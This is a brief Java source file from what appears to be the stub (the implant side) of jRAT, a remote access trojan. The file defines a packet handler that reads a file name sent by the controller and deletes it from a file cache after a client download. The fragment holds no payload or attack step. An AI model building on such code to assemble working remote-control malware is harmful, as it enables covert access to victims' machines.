package se.jrat.stub.packets.incoming;

import java.util.Set;

import se.jrat.common.io.FileCache;
import se.jrat.stub.Connection;


public class Packet103CompleteClientDownload extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();
		
		FileCache.remove(file);
	}

}
